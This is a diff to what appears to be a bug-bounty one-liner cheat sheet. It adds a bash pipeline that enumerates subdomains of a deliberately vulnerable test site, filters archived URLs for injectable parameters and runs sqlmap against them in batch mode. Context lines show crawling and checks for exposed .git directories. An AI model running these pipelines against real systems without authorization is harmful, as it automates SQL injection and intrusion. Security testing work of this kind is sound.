@@ -281,6 +281,14 @@ export domain="https://target";gospider -s $domain -d 3 -c 300 | awk '/linkfinde
 wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv | cat domains.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
 ```
 
+###  Using to findomain to SQLINJECTION.
+
+- [Explained comand](https://bit.ly/2ZeAhcF)
+
+```bash
+findomain -t testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
+```
+
 
 # Project
 
